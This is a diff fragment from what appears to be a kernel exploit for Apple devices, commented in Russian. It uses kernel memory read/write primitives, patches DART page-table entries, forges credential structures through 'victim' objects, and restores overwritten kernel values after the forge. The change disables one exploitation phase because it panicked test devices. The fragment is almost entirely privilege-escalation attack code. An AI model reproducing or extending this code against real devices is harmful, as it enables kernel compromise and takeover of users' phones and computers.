@@ -7697,14 +7697,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // 1.9.219: restore DEP-хитов после форжа (яд формы ucredPFN не живёт дальше)
     if (changed) for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
     // === 1.9.160 фаза 2: DART PTE patch с живым mapping (раунд 36) ===
-    // IOBufferMD вычисляет PA при prepare из kernel VA (+0xb8) — производные поля
-    // откатываются per-map (факт железа 1.9.158: откат +0x98). Поэтому: mapping
-    // жив (bit43=1 в TSD victim'а), ищем DART PTE по PA-маске 0x3FFFE000000
-    // (р.33/35), патчим PA-поле с сохранением флаг-бит, второй execute (тот же
-    // TSD, reuse) пишет в ctlPA.
-    // 1.9.181: фаза 2 ВКЛЮЧЕНА обратно — причина ребутов НЕ в walk, а в map-fail
-    // по дизайну (р.46). srcBad убран, walk по pipe-direct DVA безопасен.
-    if (isTable && victim != IO_OBJECT_NULL) {
+    // 1.9.249: фаза 2 ВЫКЛЮЧЕНА насовсем — она убивает прогон ПОСЛЕ вердикта:
+    // 247 умер в SPC-Z (zone bound per-cpu, panic 165106), 248 — тихий ресет в
+    // той же фазе без паник-лога. Её цель (PTE-цепь) теперь идёт через CHAIN.
+    if (0 && isTable && victim != IO_OBJECT_NULL) {
         uint64_t wVA = kpM2TClientVA(r, isTable, victim, @"p2-victim");
         uint64_t ucVA = kpLooksLikeKernelPointer(wVA) ? kp_untag_ptr(early_kread64(wVA + 0x30)) : 0;
         uint64_t provVA = kpLooksLikeKernelPointer(ucVA) ? kp_untag_ptr(early_kread64(ucVA + 0xe8)) : 0;
